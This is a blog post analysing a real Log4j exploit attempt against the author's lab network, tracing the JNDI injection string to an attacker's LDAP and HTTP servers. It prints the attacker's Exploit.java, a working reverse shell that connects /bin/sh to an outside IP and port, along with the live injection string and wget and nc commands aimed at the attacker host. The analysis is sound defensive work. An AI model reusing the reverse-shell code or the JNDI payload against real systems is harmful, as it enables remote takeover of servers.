---
title: "How to View a Log4j Payload Using ldapsearch"
date: 2021-12-30T12:35:38-06:00
toc: false
images:
categories:
  - tech
tags: 
  - log4j
  - ldapsearch
description: Exploring a log4j payload using the ldapsearch command.
---
Log4j received quite a bit of attention over the past few weeks. The vulnerability is incredibly easy to exploit, requires no human interaction, and has the ability to execute any payload a malicious actor injects. But how does it retrieve the payload? What does the JNDI `${jndi:ldap://185.25.51.48:1389/a}` string do?

Let's explore these questions by looking at a real world log4j exploit attempt. These are the actual IP address and exploit code from a real attempt to exploit the log4j vulnerability on my lab network.

## Detecting a Real World log4j Exploit Attempt

I'm using the Zeek [CVE-2021-44228](https://github.com/corelight/cve-2021-44228) log4j package to detect log4j exploits on my lab network. In this example, Zeek detected a log4j event and logged the attempt. The `uri` field contains the IP address and port of the server hosting the log4j payload `uri: 185.25.51.48:1389/a`:

```
 { [-]
   _path: log4j
   _write_ts: 2021-12-29T17:52:02.205801Z
   http_uri: /
   is_orig: true
   matched_name: false
   matched_value: true
   method: GET
   name: COOKIE
   stem: 185.25.51.48:1389
   target_host: 185.25.51.48
   target_port: 1389
   ts: 2021-12-29T17:52:02.205801Z
   uri: 185.25.51.48:1389/a
   value: ${jndi:ldap://185.25.51.48:1389/a}
} 
```

## Connecting to the LDAP Server Hosting the Payload

After determining the LDAP URL where the malicious payload is hosted, use the `ldapsearch` command to retrieve the payload.

The `-x` option enables anonymous authentication, and `-H` specifics the LDAP URL retrieved from the Zeek log:

```text
ldapsearch -x -H ldap://185.25.51.48:1389/a
```

Pay attention to the following attributes in the `ldapsearch` output:

```
javaCodeBase: http://185.25.51.48:8000/
objectClass: javaNamingReference
javaFactory: Exploit
```

These lines indicate the payload location (http://185.25.51.48:8000/) and file (Exploit) to download.

Example output:

```
jemurray@shell:~$ ldapsearch -x -H ldap://185.25.51.48:1389/a
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
javaClassName: foo
javaCodeBase: http://185.25.51.48:8000/
objectClass: javaNamingReference
javaFactory: Exploit

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

## Viewing the Contents of the Website Hosting the Payload

The `javaCodeBase` attribute contains the URL hosting the malicious payload. For this example, I want to download all files on the remote site by using `-r` (recursive) option to `wget`:

```text
wget -r http://185.25.51.48:8000/
```

Example output:

```
jemurray@shell:~/log4j$ wget -r http://185.25.51.48:8000/
--2021-12-30 17:10:13--  http://185.25.51.48:8000/
Connecting to 185.25.51.48:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 953 [text/html]
Saving to: ‘185.25.51.48:8000/index.html’

185.25.51.48:8000/index.html              100%[====================================================================================>]     953  --.-KB/s    in 0s

2021-12-30 17:10:13 (98.0 MB/s) - ‘185.25.51.48:8000/index.html’ saved [953/953]
...LOTS OF DELETED LINES GO HERE...
```

Here's the contents of the website:

```
jemurray@shell:~/log4j/185.25.51.48:8000$ ls -al
total 76
drwxr-xr-x 7 jemurray jemurray 4096 Dec 30 17:32 .
drwxr-xr-x 3 jemurray jemurray 4096 Dec 30 17:43 ..
drwxr-xr-x 3 jemurray jemurray 4096 Dec 30 17:10 bin
-rw-r--r-- 1 jemurray jemurray  177 Dec 28 16:13 Dockerfile
-rw-r--r-- 1 jemurray jemurray 1361 Dec 30 08:11 Exploit.class
-rw-r--r-- 1 jemurray jemurray 1082 Dec 30 08:11 Exploit.java
drwxr-xr-x 7 jemurray jemurray 4096 Dec 30 17:10 .git
-rw-r--r-- 1 jemurray jemurray   23 Dec 28 16:13 .gitignore
-rw-r--r-- 1 jemurray jemurray  953 Dec 30 17:10 index.html
drwxr-xr-x 8 jemurray jemurray 4096 Dec 30 17:10 jdk1.8.0_20
-rw-r--r-- 1 jemurray jemurray 4208 Dec 28 16:13 poc.py
-rw-r--r-- 1 jemurray jemurray 4239 Dec 28 16:13 README.md
-rw-r--r-- 1 jemurray jemurray   18 Dec 28 16:13 requirements.txt
drwxr-xr-x 2 jemurray jemurray 4096 Dec 30 17:10 target
-rw-r--r-- 1 jemurray jemurray 4096 Dec 28 16:20 ._ubnfilel.txt
-rw-r--r-- 1 jemurray jemurray 1109 Dec 28 16:20 ubnfilel.txt
drwxr-xr-x 4 jemurray jemurray 4096 Dec 30 17:10 vulnerable-application
```

## Examining the Exploit Code

The following attributes from the JNDI URL, tell the vulnerable system to download the `Exploit.class` file:

```
objectClass: javaNamingReference
javaFactory: Exploit
```

Within the remote directory there is a corresponding file matching the `javaFactory` attribute:

```
jemurray@shell:~/log4j/185.25.51.48:8000$ ls -al Exploit.class
-rw-r--r-- 1 jemurray jemurray 1361 Dec 30 08:11 Exploit.class
jemurray@shell:~/log4j/185.25.51.48:8000$ file Exploit.class
Exploit.class: compiled Java class data, version 52.0 (Java 1.8)
```

The source code for the class file is in the same directory:

```
jemurray@shell:~/log4j/185.25.51.48:8000$ more Exploit.java

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="185.25.51.48";
        int port=9001;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
```

## Remote Shell

The code above makes a connection to port `9100` on the remote server and connects it to `/bin/sh` within the compromised server.  We can use the `nc` command to simulate what the exploit code is doing:

```text
nc 185.25.51.48 9001
```

Example Output:

```
jemurray@shell:~/log4j/185.25.51.48:8000$ nc 185.25.51.48 9001
^C
jemurray@shell:~/log4j/185.25.51.48:8000$ nc 185.25.51.48 9001
(UNKNOWN) [185.25.51.48] 9001 (?) : Connection refused
jemurray@shell:~/log4j/185.25.51.48:8000$ nc 185.25.51.48 9001
(UNKNOWN) [185.25.51.48] 9001 (?) : Connection refused
jemurray@shell:~/log4j/185.25.51.48:8000$ nc 185.25.51.48 9001
(UNKNOWN) [185.25.51.48] 9001 (?) : Connection refused
jemurray@shell:~/log4j/185.25.51.48:8000$ nc 185.25.51.48 9001
(UNKNOWN) [185.25.51.48] 9001 (?) : Connection refused
```

I was able to connect to the remote server, but too quickly pressed `ctrl-c`.  Subsequent connections failed. It looks like the remote server was only capable of a single connection. I should have waited for a while to see if the malicious actor would attempt to execute commands.  Since we were running `nc`, all their commands would have been echo'ed back to us.

